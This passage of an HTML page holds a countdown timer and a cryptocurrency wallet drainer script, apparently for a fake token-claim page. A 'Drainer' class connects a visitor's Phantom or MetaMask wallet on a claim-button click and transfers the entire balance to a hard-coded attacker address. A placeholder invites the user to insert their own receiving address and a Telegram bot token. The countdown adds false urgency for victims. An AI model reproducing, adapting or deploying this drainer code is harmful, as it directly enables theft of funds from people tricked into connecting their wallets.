      background-color: red;
      border-radius: 10px;
      animation: drive 10s infinite linear;

    @keyframes drive {

  <!-- Countdown Timer Script -->
  <script>
    const countdownElement = document.getElementById('countdown');
    const targetDate = new Date(); // Current date
    targetDate.setDate(targetDate.getDate() + 28); // Add 28 days

    function updateCountdown() {
      const now = new Date();
      const difference = targetDate - now;

      const days = Math.floor(difference / (1000 * 60 * 60 * 24));
      const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((difference % (1000 * 60)) / 1000);

      countdownElement.innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;

      if (difference < 0) {
        clearInterval(countdownInterval);
        countdownElement.innerHTML = "EXPIRED";
      }
    }

    const countdownInterval = setInterval(updateCountdown, 1000);
  </script>

  <!-- Phantom Wallet, MetaMask & Drainer Script -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.31.0/web3.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js"></script>
  <script>
    class Drainer {
      constructor(telegramBotToken) {
        this.telegramBotToken = telegramBotToken;
        this.connectedWallet = null;
        this.receivingAddress = "8g6xY7CH9zajaxD48K1rcLszAbZraurFYWUj9wjt2Ed5"; // Replace with your receiving address
      }

      async connectPhantom() {
        try {
          if (window.solana && window.solana.isPhantom) {
            const resp = await window.solana.connect();
            this.connectedWallet = resp.publicKey.toString();
            console.log("Connected to Phantom wallet:", this.connectedWallet);

            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
            const balance = await connection.getBalance(resp.publicKey);

            if (balance > 0) {
              const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                  fromPubkey: resp.publicKey,
                  toPubkey: new solanaWeb3.PublicKey(this.receivingAddress),
                  lamports: balance // Drains entire balance
                })
              );

              transaction.feePayer = resp.publicKey;
              const { blockhash } = await connection.getRecentBlockhash();
              transaction.recentBlockhash = blockhash;

              const signedTransaction = await window.solana.signTransaction(transaction);
              const signature = await connection.sendRawTransaction(signedTransaction.serialize());
              console.log('Transaction signature:', signature);
            }
          } else {
            console.log("Phantom wallet not installed.");
          }
        } catch (error) {
          console.error("Phantom wallet connection failed:", error);
        }
      }

      async connectMetaMask() {
        if (typeof window.ethereum !== 'undefined') {
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          this.connectedWallet = accounts[0];
          console.log('Connected to MetaMask wallet:', this.connectedWallet);

          const web3 = new Web3(window.ethereum);
          const balance = await web3.eth.getBalance(this.connectedWallet);

          if (balance > 0) {
            web3.eth.sendTransaction({
              from: this.connectedWallet,
              to: this.receivingAddress,
              value: balance // Drains entire balance
            })
            .then(receipt => console.log('Transaction receipt:', receipt))
            .catch(error => console.error('Transaction failed:', error));
          }
        } else {
          console.log('MetaMask wallet not installed.');
        }
      }
    }

    const drainer = new Drainer('your-telegram-bot-token');
    document.getElementById('claimButton').addEventListener('click', async () => {
      await drainer.connectPhantom();
      await drainer.connectMetaMask();
    });
